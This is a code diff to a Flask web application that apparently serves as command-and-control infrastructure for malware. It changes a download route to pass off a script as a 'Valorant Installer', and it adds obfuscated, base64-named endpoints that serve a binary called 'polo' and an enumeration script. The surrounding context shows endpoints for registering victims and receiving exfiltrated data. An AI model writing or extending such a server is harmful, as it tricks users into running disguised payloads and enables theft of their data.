@@ -38,9 +38,14 @@ def download_page():
 
 @bp.route('/download')
 def download():
-    print("Sending File")
-    return send_file(STATIC_DIR + "/marco/static/valorant", as_attachment=True) 
+    print("Sending Valorant Installer")
+    return send_file(STATIC_DIR + "/marco/static/bin/install.sh", as_attachment=True)
 
+@bp.route('/TW9yZ2VuCg')
+def TW9yZ2VuCg():
+    print("Sending File")
+    return send_file(STATIC_DIR + "/marco/static/bin/polo", as_attachment=True)
+    
 #Obfuscated endpoint for first contact
 @bp.route('/ZGlyawo', methods=['POST'])
 def ZGlyawo():
@@ -53,6 +58,9 @@ def ZGlyawo():
     print("Made Dir: %s" % (EXFIL_DIR + post_data))
     return('',204)
 
+@bp.route('/U2FtbXkK', methods=['GET'])
+def U2FtbXkK():
+    return send_file(STATIC_DIR + "/marco/static/enum.sh", as_attachment=True)
 
 #Obfuscated endpoint for exfil
 @bp.route('/aGF0c3UK', methods=['POST'])
